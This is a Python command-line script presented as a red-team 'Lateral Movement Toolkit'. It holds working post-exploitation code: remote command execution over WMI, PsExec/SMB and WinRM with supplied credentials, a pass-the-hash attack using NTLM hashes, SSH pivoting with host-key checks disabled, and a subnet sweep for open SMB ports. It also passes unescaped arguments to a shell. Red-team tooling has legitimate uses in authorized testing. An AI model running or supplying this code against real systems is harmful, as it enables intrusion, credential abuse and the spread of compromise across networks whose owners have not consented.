#!/usr/bin/env python3
"""
Lateral Movement Toolkit - Post-Exploitation Framework
Author: Youssef Zeidi | Red Team Specialist
For authorized red team operations only.
"""

import argparse, subprocess, socket, sys

def banner():
    print("""
    ╔══════════════════════════════════════╗
    ║    Lateral Movement Toolkit v1.0     ║
    ║    Post-Exploitation Framework       ║
    ╚══════════════════════════════════════╝
    """)

def wmi_exec(target, user, password, domain, command):
    print(f"[*] WMI execution on {target}...")
    try:
        cmd = f"wmiexec.py {domain}/{user}:{password}@{target} \"{command}\""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        print(f"[+] Output:\n{result.stdout}")
        return result.stdout
    except Exception as e:
        print(f"[!] WMI exec failed: {e}")

def smb_exec(target, user, password, domain, command):
    print(f"[*] SMB/PsExec execution on {target}...")
    try:
        cmd = f"psexec.py {domain}/{user}:{password}@{target} cmd.exe /c \"{command}\""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        print(f"[+] Output:\n{result.stdout}")
        return result.stdout
    except Exception as e:
        print(f"[!] SMB exec failed: {e}")

def winrm_exec(target, user, password, command):
    print(f"[*] WinRM execution on {target}...")
    try:
        import winrm
        session = winrm.Session(f"http://{target}:5985/wsman",
                                auth=(user, password),
                                transport="ntlm")
        result = session.run_cmd(command)
        print(f"[+] Output:\n{result.std_out.decode()}")
        return result.std_out.decode()
    except ImportError:
        print("[!] pywinrm not installed: pip install pywinrm")
    except Exception as e:
        print(f"[!] WinRM failed: {e}")

def pth_attack(target, user, ntlm_hash, domain, command):
    print(f"[*] Pass-the-Hash attack on {target}...")
    try:
        cmd = f"wmiexec.py -hashes :{ntlm_hash} {domain}/{user}@{target} \"{command}\""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        print(f"[+] Output:\n{result.stdout}")
        return result.stdout
    except Exception as e:
        print(f"[!] PTH failed: {e}")

def ssh_lateral(target, key_file, user, command):
    print(f"[*] SSH lateral movement to {target}...")
    try:
        cmd = f"ssh -i {key_file} -o StrictHostKeyChecking=no {user}@{target} \"{command}\""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        print(f"[+] Output:\n{result.stdout}")
        return result.stdout
    except Exception as e:
        print(f"[!] SSH lateral failed: {e}")

def scan_network(subnet):
    print(f"[*] Scanning network: {subnet}")
    live_hosts = []
    base = ".".join(subnet.split(".")[:3])
    for i in range(1, 255):
        host = f"{base}.{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, 445))
            if result == 0:
                print(f"  [+] {host} - SMB OPEN")
                live_hosts.append(host)
            sock.close()
        except:
            pass
    print(f"[+] Found {len(live_hosts)} hosts with SMB open")
    return live_hosts

def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target IP")
    parser.add_argument("--subnet", help="Subnet to scan (e.g. 192.168.1.0)")
    parser.add_argument("--method", choices=["wmi","smb","winrm","pth","ssh","scan"], required=True)
    parser.add_argument("--user", help="Username")
    parser.add_argument("--password", help="Password")
    parser.add_argument("--hash", help="NTLM Hash")
    parser.add_argument("--domain", default="WORKGROUP")
    parser.add_argument("--key", help="SSH key file")
    parser.add_argument("--cmd", default="whoami", help="Command to execute")
    args = parser.parse_args()

    if args.method == "scan":
        scan_network(args.subnet or "192.168.1.0")
    elif args.method == "wmi":
        wmi_exec(args.target, args.user, args.password, args.domain, args.cmd)
    elif args.method == "smb":
        smb_exec(args.target, args.user, args.password, args.domain, args.cmd)
    elif args.method == "winrm":
        winrm_exec(args.target, args.user, args.password, args.cmd)
    elif args.method == "pth":
        pth_attack(args.target, args.user, args.hash, args.domain, args.cmd)
    elif args.method == "ssh":
        ssh_lateral(args.target, args.key, args.user, args.cmd)

if __name__ == "__main__":
    main()
